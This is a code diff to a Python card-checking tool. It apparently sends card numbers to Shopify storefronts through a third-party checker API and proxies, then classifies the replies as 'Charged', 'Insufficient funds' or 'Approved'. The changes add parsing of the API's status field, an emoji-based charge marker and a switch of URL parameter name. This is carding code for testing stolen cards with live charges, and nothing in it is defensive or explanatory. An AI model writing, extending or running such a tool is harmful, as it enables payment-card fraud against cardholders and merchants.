@@ -47,7 +47,8 @@ async def check_card(card: str, site: str, proxy: str) -> dict:
             else:
                 proxy_str = proxy
 
-        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
+        param_name = "site" if "shopify_parallel" in CHECKER_API_URL else "url"
+        url = f'{CHECKER_API_URL}?{param_name}={site}&cc={card}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
 
@@ -94,11 +95,17 @@ async def check_card(card: str, site: str, proxy: str) -> dict:
             }
 
         response_lower = response_msg.lower()
+        api_status = raw.get("Status", raw.get("status", ""))
+        api_status_str = str(api_status).strip().lower() if api_status is not None else ""
 
         # Charged detection
-        if any(k in response_lower for k in (
-            'charged', 'order_placed', 'thank you', 'payment successful',
-        )):
+        if (
+            api_status_str == "charged" or
+            any(k in response_lower for k in (
+                'charged', 'order_placed', 'order completed', 'thank you', 'payment successful',
+            )) or
+            '💎' in response_msg
+        ):
             return {
                 "status": "Charged",
                 "message": response_msg,
@@ -111,7 +118,10 @@ async def check_card(card: str, site: str, proxy: str) -> dict:
 
         # Insufficient Funds detection
         _insuff_keywords = ('insufficient_funds', 'insufficient funds', 'insufficient')
-        if any(k in response_lower for k in _insuff_keywords):
+        if (
+            api_status_str in ("insufficient", "insuff") or
+            any(k in response_lower for k in _insuff_keywords)
+        ):
             return {
                 "status": "Insuff",
                 "message": response_msg,
@@ -135,7 +145,10 @@ async def check_card(card: str, site: str, proxy: str) -> dict:
             'send code', 'enter code', 'verify',
         )
 
-        if any(k in response_lower for k in _approved_keywords):
+        if (
+            api_status_str == "approved" or
+            any(k in response_lower for k in _approved_keywords)
+        ):
             return {
                 "status": "Approved",
                 "message": response_msg,
@@ -254,7 +267,8 @@ async def test_site(site: str, proxy: str) -> dict:
                 ip, port = proxy_parts
                 proxy_str = f"{ip}:{port}"
 
-        url = f'{CHECKER_API_URL}?site={site}&cc={_TEST_CARD}'
+        param_name = "site" if "shopify_parallel" in CHECKER_API_URL else "url"
+        url = f'{CHECKER_API_URL}?{param_name}={site}&cc={_TEST_CARD}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
 
